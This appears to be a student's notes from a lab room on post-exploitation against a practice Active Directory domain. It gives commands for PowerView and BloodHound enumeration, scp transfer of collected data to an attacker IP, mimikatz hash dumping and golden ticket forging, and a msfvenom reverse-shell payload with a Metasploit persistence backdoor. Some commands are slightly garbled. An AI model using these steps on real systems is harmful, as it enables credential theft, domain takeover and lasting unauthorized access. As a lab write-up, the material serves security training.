<p> Notes from the Post-Exploitation room where we learn the basics of post-exploitation and maintaining access with mimikatz, bloodhound, powerview and msfvenom,
it includes post-exploitation enumeration with powerview and bloodhound, dumping hashes and golden ticket attacks with mimikatz, basic information gathering using 
windows server tools and logs, the basics of maintaining access with the persistence metaploit module and creating a backdoor into the machine to get an instant meterpreter 
shell if the system is ever shutdown or reset.</p>

<h3>Enumeration w/ Powerview: </h3>
<p><b>Powerview</b> is a powershell tool used to enumerate a on Windows domain after getting a shell </p>
<p>To start Powershell <b>"powershell -ep bypass"</b> <-ep bypass> is used to to bypass PowerShell's ExecutionPolicy restrictions ( the execution policy is part of the security strategy of PowerShell. It determines whether you can load configuration files and run scripts, and it determines which scripts) </p>
<p>Install PowerView on the victim machine and launch it </p>
<p>To enumerate the domain users <b>"Get-NetUser | select cn"</b> cn stands for common name </p>
<p>To enumerate the domain groupes <b>"Get-NetGroup -GroupName *admin*"</b> here we are selecting the groupes that has "Admin" in them</p>
<p>To find shared folders  <b>"Invoke-ShareFinder"</b> </p>
<p>Enumerating the OS  <b>"Get-NetComputer -fulldata | select operatingsystem"</b> </p>

<p>Here is some ressources for powerView/cheat sheets ! </p>
<p>https://powersploit.readthedocs.io/en/latest/Recon/</p>
<p>https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</p>
<p>https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands/</p>
<p>https://www.harmj0y.net/blog/powershell/veil-powerview-a-usage-guide/</p>

<h3>Enumeration w/ Bloodhound: </h3>
<p>Bloodhound is a graphical interface that allows you to visually map out the network, SharpHound (imilar to PowerView) takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.
SharpHound should be installed in the victim's machine in order to collect the informations in the .json file, that file should be sent to our attacker machine and analysed in Bloodhound </p>
<p>To install Bloodhound on your machine <b>apt-get install bloodhound</b> Default credentials are <b>neo4j:neo4j</b></p>
<b> Getting the .json file with Sharphound </b>
<p>1- powershell -ep bypass</p>
<p>2-Run Sharphound</p>
<p>3-Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip </p>   
<p>4-Transfer the loot.zip folder to your Attacker Machine, for that we can use scp (secure copy) which is a tool for  remote file transfer </p>
<p>First set SSH to allow root to access it, by editing /etc/ssh/sshd_config. Change the PermitRootLogin to remove # and put yes at the end</p> 
<p>Now start ssh temporarily:</p> 
<p><b>systemctl start ssh.socket</b></p> 
<p>Now on the victim machine <b> PS C:\Users\Administrator> scp .\20200609093439_loot.zip root@attacker_ip_adrs:/root/loot.zip</b></p> 
<p>Now opne Bloodhound, for the queries we will be using <b>Find all domain admins</b> to find services that are domain admins</p>
<p>And <b>List all kerberoastable accounts </b> to find users that are Kerberoastable</p>
<p>I couldn't explain Kerberoasting better than this acticle, so i highly suggest you read it : https://www.scip.ch/en/?labs.20181011#:~:text=Kerberoasting%20is%20a%20method%20used,used%20to%20crack%20passwords%20offline </p>

<h3>Dumping hashes w/ mimikatz: </h3>
<p>Mimikatz is a post-exploitation tool mainly used for dumping user credentials (NTLM hashes) inside of a active directory network</p>
<p>1-Install Mimikatz on the victim machine</p>
<p>2-Run the Mimikatz binary</p>
<p>3-Run <b>"privilege::debug"</b> and make the it returns <b>"Privilege '20' ok"</b> to ensure that you are running it as an Administrator</p>
<p>4-Run<b> "lsadump::lsa /patch"</b> To dump the hashes</p>
<b>Cracking the hashes with hashcat</b>
<p>Run "hashcat -m --force 1000 <hash> rockyou.txt"</p>

<h3>Golden Ticket Attacks w/ mimikatz :</h3>
<p>A Golden Ticket attack is when an attacker has complete and unrestricted access to an entire domain — all computers, files, folders, and most importantly, the access control system itself.
Golden Ticket attacks can be carried out against Active Directory domains, where access control is implemented using Kerberos tickets issued to authenticated users by a Key Distribution Service. The attacker gains control over the domain’s Key Distribution Service account (KRBTGT account) by stealing its NTLM hash. This allows the attacker to generate Ticket Granting Tickets (TGTs) for any account in the Active Directory domain. With valid TGTs, the attacker can request access to any resource/system on its domain from the Ticket Granting Service (TGS).
Because the attacker is controlling the component of the access control system that is responsible for issuing Ticket Granting Tickets (TGTs), then he has the golden ticket to access any resource on the domain.</p>
<p>1-Dump the krbtgt Hash</p>
<p><b>Run Mimikatz</b></p>
<p><b>privilege::debug</b> ensure this outputs [privilege "20" ok]</p>
<p><b>lsadump::lsa /inject /name:krbtgt</b> This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket</p>
<p>Output</p>
<src img="https://i.imgur.com/Yzq71aI.png">
<p>2-Creating the Golden ticket </p>
<b>Run "kerberos::golden /user: /domain: /sid: /krbtgt: /id:" </b>
<p>Where user is Administrator, domain is controller.local (given in the room), sid, krbtgt(put the NTLM hash) and id are given in the previous command</p>
<p>3-Using the Golden ticket to access other machines</p>
<p>Run <b>misc::cmd</b>To start a new command prompt with elevated privileges to all machines on the network</p>

<h3>Enumeration w/ Server Manager:</h3>
<p>We will be usingthe built in windows features such as the server manager for enumeration.If we have Domain adin access, we can change trusts, add or remove users, look at groups,find other users with other sensitive information on their machines or find other users on the domain network with access to other networks in order to pivot to another network and continue  testing.
This can also be a way of easily identifying what kind of firewall the network is using if you have not already enumerated it.</p>
<p>For this part we needto RDP into the machine, in your attacker machine run <b>rdesktop -u SG ip_adrs</b></p>
<p>From this, we mearn that it's not secured to keep passwords of users/accounts in the description ! </p>

<h3>Maintaining Access:</h3>
<p>To maintain access, we will be using Metasploit and Msfvenom, we will setup a Meterpreter shell, and then use the persistant Metasploit module to create a backdoor that will always give us a shell in case the system is shutdown/patched/or reset</p>
<p>1-Generating a Payload w/ msfvenom</p>
<p>To generate a basic Reverse TCP shell for windows, run <b>"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe"</b><^/p>
<p>Next, we will be transfering the generated payload to the Victim machine, for that we can use scp over ssh </p>
<p>Then, we startup Metasploit and create a listeneer on the Port we set the shell on, by using <b>"use exploit/multi/handler"</b></p>
<p>Now we can run the shell on the target machine. which will give a meterpreter shell in metasploit</p>
<p>To run the persistante module, we need to background our session, then run <b>"use exploit/windows/local/persistence"</b> then  set the session to your background meterpreter session with <b>"set session 1"</b>Then run the exploit</p>
<p>If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit multi handler (use multi/handler)load to windows/meterpreter/reverse_tcp allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.</p>



